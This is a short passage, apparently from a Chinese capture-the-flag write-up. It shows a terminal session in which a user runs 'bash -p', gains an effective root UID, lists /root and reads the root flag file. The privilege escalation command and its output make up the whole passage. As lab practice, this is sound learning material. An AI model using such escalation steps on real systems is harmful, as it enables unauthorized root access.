说明成功执行了命令！！！！

```bash
he110wor1d@singdancerap:~/thekey2root$ bash -p
bash-5.0# whoami;id
root
uid=1001(he110wor1d) gid=1001(he110wor1d) euid=0(root) egid=0(root) groups=0(root),1001(he110wor1d)
bash-5.0# cd /root
bash-5.0# ls -la
total 28
drwx------  3 root root 4096 Mar  3 04:20 .
drwxr-xr-x 18 root root 4096 Feb 27 16:41 ..
lrwxrwxrwx  1 root root    9 Mar  1 01:11 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Jan 13  2021 .local
lrwxrwxrwx  1 root root    9 Mar  1 01:12 .mysql_history -> /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root  151 Mar  1 04:13 root.txt
-rw-r--r--  1 root root   75 Jan 11  2021 .selected_editor
bash-5.0# cat root.txt 
#During the process of PWN, the execution of the system function does not necessarily have to be bash.

root flag:943ac8c9-f696-11ef-8bd4-005056207011
```

拿到flag！！！